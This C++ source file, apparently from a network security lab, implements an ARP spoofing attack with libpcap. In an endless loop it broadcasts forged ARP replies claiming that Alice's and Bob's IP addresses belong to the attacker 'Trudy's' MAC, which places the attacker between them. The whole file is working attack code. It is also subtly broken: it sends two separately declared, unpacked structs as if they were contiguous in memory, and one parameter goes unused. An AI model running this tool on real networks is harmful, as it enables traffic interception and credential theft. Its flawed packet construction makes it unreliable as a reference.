#include <iostream>
#include <unistd.h>
#include <cstring>
#include <string>
#include <pcap.h>

struct EthernetHeader {
    u_int8_t dest_mac[6];
    u_int8_t src_mac[6];
    u_int16_t eth_type;
};

struct ARPHeader {
    u_int16_t hw_type;
    u_int16_t proto_type;
    u_int8_t hw_addr_len;
    u_int8_t proto_addr_len;
    u_int16_t op;
    u_int8_t src_mac[6];
    u_int8_t src_ip[4];
    u_int8_t dest_mac[6];
    u_int8_t dest_ip[4];
};

pcap_t *descriptor;

void gratuitous_fake_ARP(const char * TARGET_MAC, const char * DST_MAC, const char * TARGET_IP){
        EthernetHeader ethernet_header;
        ARPHeader arp_header;

        memset(ethernet_header.dest_mac, 0xFF, 6);

        sscanf(TARGET_MAC, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &ethernet_header.src_mac[0], &ethernet_header.src_mac[1], &ethernet_header.src_mac[2],
            &ethernet_header.src_mac[3], &ethernet_header.src_mac[4], &ethernet_header.src_mac[5]);

        ethernet_header.eth_type = htons(0x0806);

        arp_header.hw_type = htons(1);
        arp_header.proto_type = htons(0x0800);
        arp_header.hw_addr_len = 6;
        arp_header.proto_addr_len = 4;
        arp_header.op = htons(2); 
        memcpy(arp_header.src_mac, ethernet_header.src_mac, 6);
        inet_pton(AF_INET, TARGET_IP, arp_header.src_ip);
        memset(arp_header.dest_mac, 0xFF, 6);
        inet_pton(AF_INET, TARGET_IP, arp_header.dest_ip);

        pcap_sendpacket(descriptor, reinterpret_cast<const u_char*>(&ethernet_header), sizeof(EthernetHeader) + sizeof(ARPHeader));
        std::cout << ".";
}

int main() {
        char error[PCAP_ERRBUF_SIZE];

        descriptor = pcap_open_live("eth0", BUFSIZ, 1, 1000, error);
        if (descriptor == NULL) {
                std::cerr << "Interface error: " << error << std::endl;
                return 1;
        }

        const char * TRUDYS_MAC = "00:16:3e:3d:17:94";
        const char * ALICES_MAC = "00:16:3e:ae:c3:fd";
        const char * BOBS_MAC = "00:16:3e:d2:a2:f0";
        const char * ALICES_IP = "172.31.0.2";
        const char * BOBS_IP = "172.31.0.3";

        while(true){
                gratuitous_fake_ARP(TRUDYS_MAC,"FF:FF:FF:FF:FF:FF",BOBS_IP);
                gratuitous_fake_ARP(TRUDYS_MAC,"FF:FF:FF:FF:FF:FF",ALICES_IP);
                sleep(5);
        }

        pcap_close(descriptor);

        return 0;
}

